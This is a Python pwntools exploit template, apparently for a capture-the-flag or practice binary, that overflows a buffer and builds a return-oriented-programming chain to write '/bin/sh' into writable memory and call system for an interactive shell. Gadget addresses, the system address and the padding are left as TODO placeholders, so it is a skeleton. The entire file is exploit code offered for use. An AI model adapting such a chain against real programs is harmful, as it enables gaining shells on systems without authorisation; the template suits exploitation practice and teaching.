#!/usr/bin/python

import sys
from pwn import *

pop = # TODO - Find pop X; pop Y; ret
mov = # TODO - Find mov [X], Y; ret

# TODO - Use 4/8 byte writes depending on x86 or x64
def write(what, where):
    payload = ""
    while what != "":
        chunk = what[:4]
        what = what[4:]
        payload += p32(pop)
        payload += p32(where)
        payload += chunk
        payload += p32(mov)
        where += 4
    return payload

# Error handling cause I'm a good software engineer... lol jks
if (len(sys.argv) != 2):
    log.failure("Usage: %s <binary>" % sys.argv[0])
    exit(1)

# Create a ROP object to look up symbols
elf = context.binary = ELF(sys.argv[1])
rop = ROP(elf)

# Build ROP call chain
system = # TODO - find system address
info("System at: " + hex(system))

payload = "A"*44 # TODO - Change to appropriate padding
# TODO - Change write location to writeable memeory (e.g. elf.bss())
payload += write("/bin/sh\x00", elf.bss()) 
payload += p32(system) 
# TODO - Ensure system execution is correct (need pop rdi; ret for x64)
payload += p32(elf.bss())
info("Payload: " + payload)

# Pwn
p = process(sys.argv[1])
p.recvuntil('> ')
p.sendline(payload)
p.interactive()
